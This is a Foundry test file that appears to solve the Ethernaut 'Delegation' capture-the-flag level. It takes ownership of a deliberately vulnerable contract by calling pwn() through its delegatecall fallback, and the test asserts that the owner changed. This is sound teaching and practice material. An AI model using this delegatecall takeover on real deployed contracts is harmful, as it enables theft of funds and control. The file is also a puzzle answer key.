// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Delegation.sol";

contract DelegationTest is Test {
    Delegate internal _delegate;
    Delegation internal _delegation;

    function setUp() public {
        _delegate = new Delegate(address(0));
        _delegation = new Delegation(address(_delegate));
    }

    function test_attack() public {
        address user = vm.addr(1);

        vm.startPrank(user, user);

        Delegate(address(_delegation)).pwn();

        vm.stopPrank();

        assertEq(_delegation.owner(), user, "owner");
    }
}